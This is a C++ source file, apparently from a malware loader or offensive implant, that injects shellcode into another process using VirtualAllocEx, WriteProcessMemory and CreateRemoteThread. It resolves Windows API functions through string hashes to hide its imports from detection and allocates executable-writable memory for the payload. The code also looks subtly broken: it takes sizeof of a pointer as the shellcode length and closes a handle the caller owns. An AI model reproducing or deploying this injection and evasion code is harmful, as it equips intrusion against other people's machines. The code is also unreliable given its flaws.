#include "execute.hpp"

namespace execute {
	BOOL CreateRemoteThread(_In_ HANDLE process_handle, _In_ BYTE* shellcode)
	{
		HANDLE process = NULL;
		PVOID address_ptr = NULL;
		BOOL success = FALSE;
		HANDLE thread_handle = NULL;
		SIZE_T bytes_written = 0;
		HMODULE kernel32 = NULL;
		BOOL result = FALSE;
		DWORD process_id = NULL;

#pragma region [Kernel32 Functions]
		typeGetLastError GetLastErrorC = NULL;
		typeOpenProcess OpenProcessC = NULL;
		typeVirtualAllocEx VirtualAllocExC = NULL;
		typeWriteProcessMemory WriteProcessMemoryC = NULL;
		typeCreateRemoteThread CreateRemoteThreadC = NULL;
		typeCloseHandle CloseHandleC = NULL;

		constexpr ULONG hash_kernel32 = HashString("KERNEL32.DLL");
		kernel32 = memory::GetModuleHandleC(hash_kernel32);
		if (kernel32 == NULL)
		{
			LOG_ERROR("GetModuleHandle Failed to import Kernel32");
		}

		GetLastErrorC = (typeGetLastError)memory::GetProcAddressC(kernel32, HashString("GetLastError"));
		OpenProcessC = (typeOpenProcess)memory::GetProcAddressC(kernel32, HashString("OpenProcess"));
		VirtualAllocExC = (typeVirtualAllocEx)memory::GetProcAddressC(kernel32, HashString("VirtualAllocEx"));
		WriteProcessMemoryC = (typeWriteProcessMemory)memory::GetProcAddressC(kernel32, HashString("WriteProcessMemory"));
		CreateRemoteThreadC = (typeCreateRemoteThread)memory::GetProcAddressC(kernel32, HashString("CreateRemoteThread"));
		CloseHandleC = (typeCloseHandle)memory::GetProcAddressC(kernel32, HashString("CloseHandle"));

#pragma endregion

		// process_handle = open_process(PROCESS_ALL_ACCESS, FALSE, pid);
		// if (process == NULL)
		// {
		// 	LOG_ERROR("[-] Error during OpenProcess call pid: %lu (Code: %08lX)", process_handle, get_last_error());
		// 	goto CLEANUP;
		// }

		address_ptr = VirtualAllocExC(process_handle, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
		if (address_ptr == NULL)
		{
			LOG_ERROR("Error during VirtualAllocEx (Code: %08lX)", GetLastErrorC());
			goto CLEANUP;
		}

		success = WriteProcessMemoryC(process_handle, address_ptr, shellcode, sizeof(shellcode), &bytes_written);
		if (!success)
		{
			LOG_ERROR("Error during WriteProcessMemory (%llu bytes written)", bytes_written);
			goto CLEANUP;
		}

		thread_handle = CreateRemoteThreadC(process_handle, NULL, NULL, (LPTHREAD_START_ROUTINE)address_ptr, NULL, NULL, NULL);
		if (thread_handle == NULL)
		{
			LOG_ERROR("Error during CreateRemoteThread (Code: %08lX)", GetLastErrorC());
			goto CLEANUP;
		}

		result = TRUE;

	CLEANUP:
		CloseHandleC(process_handle);
		CloseHandleC(thread_handle);
		return result;
	}
} // End of execute namespace